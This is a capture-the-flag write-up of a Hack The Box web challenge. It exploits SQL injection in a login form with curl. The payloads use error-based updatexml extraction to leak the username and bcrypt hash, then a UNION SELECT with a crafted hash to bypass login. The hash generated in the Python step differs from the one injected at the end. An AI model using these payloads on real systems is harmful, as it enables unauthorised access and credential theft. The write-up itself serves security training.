# [Web - very easy] KORP Terminal

This challenge is a blackbox exercise: a login page with 2 fields (username, password) is presented.

Sending a single quote `'` in the `username` field leads to a SQL error: we are facing a SQL injection challenge.

```bash
$ curl -d "username=' UNION SELECT 'aaa','bbb' limit 1 -- &password=aaa" http://94.237.51.203:36049
{"error":{"message":["1222","1222 (21000): The used SELECT statements have a different number of columns","21000"],"type":"DataError"}}

$ curl -d "username=' UNION ALL SELECT 1 -- &password=aaa" http://94.237.51.203:36049
{"error":{"message":["Invalid salt"],"type":"ValueError"}}
```

Since an error is returned, we can have that error give more information using the [updatexml](https://dev.mysql.com/doc/refman/8.3/en/xml-functions.html#function_updatexml) function. That makes the rest of the challenge easier.

```bash
# returning the date, validating that output works
$ curl -d "username=admin' and updatexml(null,concat(0x0a,now()),null)-- - -- &password=aaa" http://94.237.51.203:36049
{"error":{"message":["1105","1105 (HY000): XPATH syntax error: '\n2024-03-11 14:37:27'","HY000"],"type":"DatabaseError"}}

# validating the admin username
$ curl -d "username=admin' and updatexml(null,concat(0x0a,(select username from users limit 1)),null)-- - -- &password=aaa" http://94.237.51.203:36049
{"error":{"message":["1105","1105 (HY000): XPATH syntax error: '\nadmin'","HY000"],"type":"DatabaseError"}}

# checking what type of password it is using
$ curl -d "username=admin' and updatexml(null,concat(0x0a,(select LEFT(password,30) from users limit 1)),null)-- - -- &password=aaa" http://94.237.51.203:36049
{"error":{"message":["1105","1105 (HY000): XPATH syntax error: '\n$2b$12$OF1QqLVkMFUwJrl1J1YG9u6'","HY000"],"type":"DatabaseError"}}
```

Since we've got a hashed password, and that the first error was `Invalid salt`, we can infer that inputing a known hash would help. We also know that the hash is generated by Flask. Running `python` to create a hash of a known password, here `aaa`

```python
>>> from flask import Flask
>>> from flask_bcrypt import Bcrypt
>>> app = Flask(__name__)
>>> bcrypt = Bcrypt(app)
>>> pw_hash = bcrypt.generate_password_hash('aaa')
>>> pw_hash
b'$2b$12$dedwkx93eNdeu4Jr8exKiu4u/40YrtqD/hZemQu8hZiIY4nlhc1cG'
```

Finally giving that hash to the SQL injection leads to the flag

```bash
$ curl -d "username=' UNION SELECT '\$2b\$12\$JCfotu5YX71qZq9Ljl8mEumpE1uvff1mt4YTPrYKsAT8evEu7onZG' -- &password=aaa" http://94.237.51.203:36049
HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
```